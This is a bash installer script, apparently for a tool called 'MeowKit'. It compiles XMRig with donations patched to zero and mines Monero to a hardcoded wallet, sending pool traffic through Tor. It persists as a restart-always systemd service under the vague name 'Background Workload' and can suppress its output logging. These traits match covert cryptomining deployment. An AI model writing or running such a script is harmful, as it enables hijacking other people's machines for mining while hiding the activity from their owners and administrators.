#!/usr/bin/env bash
WALLET='47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG'
POOL='gulf.moneroocean.stream:10001'
XMRIG_VERSION='6.26.0'
XMRIG_COMMIT='b2ca72480c58d197e18c885d9fc1a0c8d517e60a'

worker_name() {
  install -d -m 750 "$MEOWKIT_DIR" || fail 'Cannot create settings directory.'
  if [[ -z ${WORKER_NAME:-} && -f $MEOWKIT_DIR/worker-name ]]; then WORKER_NAME=$(<"$MEOWKIT_DIR/worker-name"); fi
  WORKER_NAME=${WORKER_NAME:-$(hostname -s 2>/dev/null || echo meow-worker)}
  [[ $WORKER_NAME =~ ^[A-Za-z0-9._-]{1,32}$ ]] || fail 'Worker name must be 1-32 chars: letters, numbers, dot, underscore or hyphen.'
  RIG_NAME=$WORKER_NAME
  printf '%s\n' "$RIG_NAME" > "$MEOWKIT_DIR/worker-name" || fail 'Could not save worker name.'
  chmod 600 "$MEOWKIT_DIR/worker-name" || warn 'Could not restrict worker-name permissions.'
}

install_xmrig() {
  begin_step 'XMRig source build'
  if [[ ${REPAIR:-0} == 1 && -x $MEOWKIT_BIN ]] && "$MEOWKIT_BIN" --version 2>&1 | grep -Fq "$XMRIG_VERSION"; then
    log "Existing XMRig $XMRIG_VERSION binary is valid; preserving it."
    return 0
  fi

  make_workdir
  local source="$WORKDIR/xmrig-src"
  local build="$WORKDIR/xmrig-build"
  local actual_commit
  local build_jobs=${MEOWKIT_BUILD_JOBS:-2}
  [[ $build_jobs =~ ^[1-9][0-9]*$ ]] || fail 'MEOWKIT_BUILD_JOBS must be a positive integer.'

  # Pin the upstream source tag and commit. This checkout intentionally uses
  # the normal network, not Tor: Tor is reserved for the miner's pool traffic.
  [[ $XMRIG_VERSION == '6.26.0' ]] || fail 'Update the pinned XMRig commit before changing XMRIG_VERSION.'
  require_cmd git
  require_cmd cmake
  info "Fetching XMRig source v$XMRIG_VERSION directly from GitHub (not through Tor)."
  git clone --quiet --depth 1 --branch "v$XMRIG_VERSION" https://github.com/xmrig/xmrig.git "$source" ||
    fail 'Could not fetch the pinned XMRig source from GitHub.'
  actual_commit=$(git -C "$source" rev-parse HEAD) || fail 'Could not verify the XMRig source revision.'
  [[ $actual_commit == "$XMRIG_COMMIT" ]] || fail "Unexpected XMRig source revision: $actual_commit"

  # XMRig enforces a 1% minimum in its stock source. Patch both constants,
  # then verify the exact source state before compiling.
  sed -i \
    -e 's/kDefaultDonateLevel = 1;/kDefaultDonateLevel = 0;/' \
    -e 's/kMinimumDonateLevel = 1;/kMinimumDonateLevel = 0;/' \
    "$source/src/donate.h"
  grep -Fq 'kDefaultDonateLevel = 0;' "$source/src/donate.h" ||
    fail 'Could not set XMRig default donation to 0%.'
  grep -Fq 'kMinimumDonateLevel = 0;' "$source/src/donate.h" ||
    fail 'Could not set XMRig minimum donation to 0%.'

  info "Compiling XMRig with $build_jobs build job(s); this may take a few minutes."
  cmake -S "$source" -B "$build" \
    -DCMAKE_BUILD_TYPE=Release \
    -DWITH_HWLOC=ON \
    -DWITH_TLS=OFF \
    -DWITH_OPENCL=OFF \
    -DWITH_CUDA=OFF \
    -DWITH_MSR=ON \
    -DWITH_ASM=ON ||
    fail 'XMRig CMake configuration failed. Check that the compiler and development packages installed correctly.'
  cmake --build "$build" --parallel "$build_jobs" ||
    fail 'XMRig source compilation failed.'
  [[ -x $build/xmrig ]] || fail 'The XMRig build completed without producing the expected executable.'
  "$build/xmrig" --version 2>&1 | grep -Fq "$XMRIG_VERSION" ||
    fail 'The compiled XMRig binary did not report the pinned version.'
  install -m 0755 "$build/xmrig" "$MEOWKIT_BIN" ||
    fail 'Could not install the compiled XMRig binary.'
  info "Installed source-built XMRig $XMRIG_VERSION with developer donation disabled (0%)."
}

write_tor_check() {
  cat > /usr/local/sbin/meowkit-tor-check <<'EOFCHK'
#!/bin/sh
set -u
attempt=1
max_attempts=8
last_error='Tor circuit did not become ready.'
while [ "$attempt" -le "$max_attempts" ]; do
  if response=$(/usr/bin/curl --connect-timeout 8 --max-time 20 --silent --show-error --fail --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip 2>&1); then
    if printf '%s' "$response" | /usr/bin/python3 -c 'import json,sys; d=json.load(sys.stdin); sys.exit(0 if d.get("IsTor") is True else 1)' 2>/dev/null; then
      exit 0
    fi
    last_error='SOCKS proxy responded, but the response did not confirm a Tor exit node.'
  else
    last_error=$response
  fi
  if [ "$attempt" -lt "$max_attempts" ]; then
    echo "[MeowKit] Tor is not ready (attempt $attempt/$max_attempts); retrying in 5 seconds." >&2
    sleep 5
  fi
  attempt=$((attempt + 1))
done
echo "[MeowKit] Tor pre-start check failed after $max_attempts attempts: $last_error" >&2
exit 1
EOFCHK
  chmod 755 /usr/local/sbin/meowkit-tor-check
}

write_configuration() {
  begin_step 'Validated miner configuration'
  LOG_MODE=${LOG_MODE:-normal}
  case $LOG_MODE in
    normal) LOG_STDOUT=journal; LOG_STDERR=journal ;;
    errors) LOG_STDOUT=null; LOG_STDERR=journal ;;
    none) LOG_STDOUT=null; LOG_STDERR=journal ;;
    *) fail 'Log mode must be normal, errors or none.' ;;
  esac
  [[ ! -e $MEOWKIT_DIR || -d $MEOWKIT_DIR ]] || fail "$MEOWKIT_DIR exists but is not a directory."
  install -d -m 750 "$MEOWKIT_DIR" || fail 'Cannot create application settings directory.'
  printf 'LOG_MODE=%s\n' "$LOG_MODE" > "$MEOWKIT_DIR/settings.conf" || warn 'Could not persist logging preference.'
  chmod 600 "$MEOWKIT_DIR/settings.conf" 2>/dev/null || warn 'Could not restrict settings permissions.'
  [[ ! -e $MEOWKIT_DIR/config.json || -f $MEOWKIT_DIR/config.json ]] || fail "$MEOWKIT_DIR/config.json exists but is not a regular file. Move or remove the conflicting directory, then rerun."
  worker_name
  local tmp="$MEOWKIT_DIR/config.json.tmp.$$"
  cat > "$tmp" <<EOFJSON
{
  "donate-level": 0,
  "donate-over-proxy": 0,
  "autosave": false,
  "background": false,
  "colors": false,
  "title": false,
  "randomx": { "init": -1, "mode": "auto", "1gb-pages": true, "rdmsr": true, "wrmsr": true, "numa": true },
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "priority": 1, "yield": true, "asm": true },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "pools": [
    { "algo": null, "coin": null, "url": "${POOL}", "user": "${WALLET}", "pass": "${RIG_NAME}", "rig-id": "${RIG_NAME}", "keepalive": true, "tls": false, "daemon": false, "socks5": "127.0.0.1:9050" }
  ]
}
EOFJSON
  python3 -m json.tool "$tmp" >/dev/null || { rm -f "$tmp"; fail 'Generated config.json is invalid JSON; refusing to install it.'; }
  chmod 640 "$tmp"
  chown root:root "$tmp"
  mv -f "$tmp" "$MEOWKIT_DIR/config.json"
  # Keep the runtime environment variable and the generated ExecStart
  # argument in sync. Do not reference an unset MEOWKIT_THREADS under set -u.
  [[ ${THREADS:-} =~ ^[1-9][0-9]*$ ]] || fail 'Detected miner thread count is missing or invalid.'
  MEOWKIT_THREADS=$THREADS
  printf 'MEOWKIT_THREADS=%s\n' "$MEOWKIT_THREADS" > "$MEOWKIT_DIR/runtime.env"
  chmod 640 "$MEOWKIT_DIR/runtime.env"
  write_tor_check
  # Only expose huge-page sysfs paths that actually exist on this kernel.
  # Keep each path a separate systemd ReadWritePaths argument; concatenating
  # them without whitespace creates one invalid path and breaks namespace setup.
  local hp_write_paths=()
  [[ -d /sys/kernel/mm/hugepages/hugepages-2048kB ]] && hp_write_paths+=(/sys/kernel/mm/hugepages/hugepages-2048kB)
  [[ -d /sys/kernel/mm/hugepages/hugepages-1048576kB ]] && hp_write_paths+=(/sys/kernel/mm/hugepages/hugepages-1048576kB)
  local HP_WRITE_PATHS=''
  if (("${#hp_write_paths[@]}" > 0)); then
    printf -v HP_WRITE_PATHS '%s ' "${hp_write_paths[@]}"
    HP_WRITE_PATHS=${HP_WRITE_PATHS% }
  fi


  local hp_pre=''
  if [[ -x /usr/local/sbin/meowkit-hugepages ]]; then hp_pre='ExecStartPre=-/usr/local/sbin/meowkit-hugepages'; else warn 'Huge-page helper unavailable; service will use kernel defaults.'; fi

  # A previous failed/manual install may have left systemd's standard
  # mask symlink here. Remove only that exact /dev/null mask; never follow or
  # overwrite an unrelated symlink or non-regular path.
  if [[ -L $MEOWKIT_SERVICE ]]; then
    local service_link
    service_link=$(readlink "$MEOWKIT_SERVICE") || fail 'Could not inspect existing MeowKit service symlink.'
    [[ $service_link == /dev/null ]] || fail "Refusing to replace unexpected service symlink: $MEOWKIT_SERVICE -> $service_link"
    rm -f -- "$MEOWKIT_SERVICE" || fail 'Could not remove the stale systemd mask for meowkit.service.'
    info 'Removed stale systemd mask for meowkit.service.'
  elif [[ -e $MEOWKIT_SERVICE && ! -f $MEOWKIT_SERVICE ]]; then
    fail "$MEOWKIT_SERVICE exists but is not a regular file."
  fi

  cat > "$MEOWKIT_SERVICE" <<EOFUNIT
[Unit]
Description=MeowKit Background Workload
Wants=network-online.target ${TOR_UNIT}
After=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
# Tor preflight (195s worst case) plus bounded huge-page preparation (up to 210s worst case).
TimeoutStartSec=480
${hp_pre}
ExecStartPre=/usr/local/sbin/meowkit-tor-check
EnvironmentFile=${MEOWKIT_DIR}/runtime.env
ExecStart=${MEOWKIT_BIN} --config=${MEOWKIT_DIR}/config.json --threads=\${MEOWKIT_THREADS}
Restart=always
RestartSec=30
Nice=10
CPUWeight=20
CPUQuota=${CPU_QUOTA}%
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=${MEOWKIT_DIR} ${HP_WRITE_PATHS}
StandardOutput=${LOG_STDOUT}
StandardError=${LOG_STDERR}
SyslogIdentifier=meowkit

[Install]
WantedBy=multi-user.target
EOFUNIT
  chmod 644 "$MEOWKIT_SERVICE"
  systemd-analyze verify "$MEOWKIT_SERVICE" || fail 'systemd rejected the generated service unit.'
  # Calculate and persist the final schedule/guest-aware allocation before the
  # first miner start. This avoids starting at baseline and immediately restarting.
  if [[ -x /usr/local/sbin/meowkit-resource-watch ]]; then
    /usr/local/sbin/meowkit-resource-watch --prepare || fail 'Could not prepare the initial adaptive resource profile; miner was not started.'
  fi
  systemctl daemon-reload || fail 'systemd could not reload unit files.'
  systemctl enable meowkit.service >/dev/null 2>&1 || fail 'Could not enable meowkit.service at boot.'
  info 'Starting the MeowKit systemd service.'
  systemctl restart meowkit.service || info 'Service restart did not complete immediately; inspect journalctl -u meowkit.service.'
  if [[ -x /usr/local/sbin/meowkit-resource-watch ]]; then
    systemctl enable --now meowkit-resource-watch.timer >/dev/null 2>&1 || warn 'Could not enable the adaptive resource timer.'
  fi
}

run_install() {
  CURRENT_STEP=preflight
  # Only require commands available on a minimal Debian/Ubuntu base install
  # before bootstrapping. python3/curl/tar/gzip are installed by bootstrap_tor.
  require_cmd systemctl
  require_cmd apt-get
  require_cmd dpkg-query
  bootstrap_tor
  detect_resources
  require_cmd tar
  require_cmd gzip
  require_cmd sha256sum
  configure_msr
  configure_hugepages
  configure_resource_manager
  install_xmrig
  write_configuration
  info "Installed meowkit.service; worker ${RIG_NAME}; ${THREADS}/${TOTAL_THREADS} available CPU threads; CPUQuota=${CPU_QUOTA}%."
  info 'Tor is a runtime dependency only: a slow Tor bootstrap will not block VM boot.'
}
